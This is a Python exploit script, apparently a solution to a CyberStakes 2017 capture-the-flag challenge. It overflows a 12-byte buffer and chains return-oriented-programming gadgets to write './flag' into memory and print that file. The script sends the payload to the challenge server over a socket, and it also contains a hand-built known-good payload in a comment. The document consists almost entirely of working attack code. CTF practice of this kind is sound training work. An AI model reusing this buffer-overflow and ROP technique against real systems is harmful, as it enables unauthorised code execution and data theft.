#!/usr/bin/python3
import socket,time
BUFFSIZE = 12
print_file = b"\xe6\x81\x04\x08" # calls open, but puts pointer to argument on the stack
read_input = b"\xa2\x82\x04\x08" # not quite sure why-but it puts a pointer into eax that I need
addEDXmovDL = b"\xfb\x80\x04\x08" # increment dl by 1, put into eax pointer
base_file_address = 0x08049760 # Pointer that print_file uses for filename

def buildPayload(filename):
    myArr = []
    
    for i in range(0,len(filename)): # converting filename into hex values and sorting them by value
        myArr.append([hex(ord(filename[i])),i,filename[i]])
    myArr.sort()
    
    payload = b"A"*(BUFFSIZE)+read_input
    
    
    for i in range(len(myArr)):
        myHex = '0'+str(hex(base_file_address+myArr[i][1]))[2:] # calculates the byte offset for each character
        # had to re-add the leading zero. Did it in a janky way.
        myStr=''
        
        for j in range(len(myHex),0,-2):
            myStr+=chr(int('0x'+myHex[j-2:j],16)) # make the address in little endian. Also jank
        myStr = (bytes(myStr,'utf-8').replace(b'\xc2',b'')) # not quite sure why \xc2 appears here when converting but....more jank
        
        if i == 0:
            payload += myStr*5+addEDXmovDL*(int(myArr[i][0],16)+2) # myStr is the pointer to the filename, addEDXmovDL until its the character you want
        else:
            payload += read_input+b"A"*0x10+myStr+b"A"*12+addEDXmovDL*(int(myArr[i][0],16)-int(myArr[i-1][0],16)) # DL is already the value of the previous character. Don't over-increment
    return payload+print_file
        
        

def sendExploit(payload):    
    s = socket.socket()
    s.connect(("cyberstakes2017.hackcenter.com",52920))
    time.sleep(1)
    print(s.recv(1024).decode().replace("\n",""))
    print("Sending payload...")
    s.send(payload+b"\n")
    time.sleep(1)
    print(s.recv(1024).decode().replace("\n",""))
    s.close()


def main():
    ''' Known-good payload
First line of payload actually increments dl to 0x2e and moves it into byte 1 0x08049760
Second line only has to increment dl once to 0x2e and move into byte 2
After that we jump around because of the numerical order of "flag" = 66 6c 61 67
Need to write them in the order 61 66 67 6c
All together we end up writing ./flag (2e 2f 66 6c 61 67) into specific addresses
    
    
    payload = b"A"*(BUFFSIZE)+read_input+b"\x60\x97\x04\x08"*5+addEDXmovDL*0x30 \
        +read_input+b"A"*0x10+b"\x61\x97\x04\x08"+b"A"*12 +addEDXmovDL \
        +read_input+b"A"*0x10+b"\x64\x97\x04\x08"+b"A"*12+addEDXmovDL*(0x61-0x2f) \
        +read_input+b"A"*0x10+b"\x62\x97\x04\x08"+b"A"*12+addEDXmovDL*(0x66-0x61) \
        +read_input+b"A"*0x10+b"\x65\x97\x04\x08"+b"A"*12+addEDXmovDL \
        +read_input+b"A"*0x10+b"\x63\x97\x04\x08"+b"A"*12+addEDXmovDL*(0x6c-0x67)+print_file
    
    '''
    
    payload = buildPayload('./flag')
    
    sendExploit(payload)
    #saveExploit(payload)

def saveExploit(payload):
    with open("longropsolution.txt",'wb') as f:
        f.write(payload)
        
if __name__=='__main__':
    main()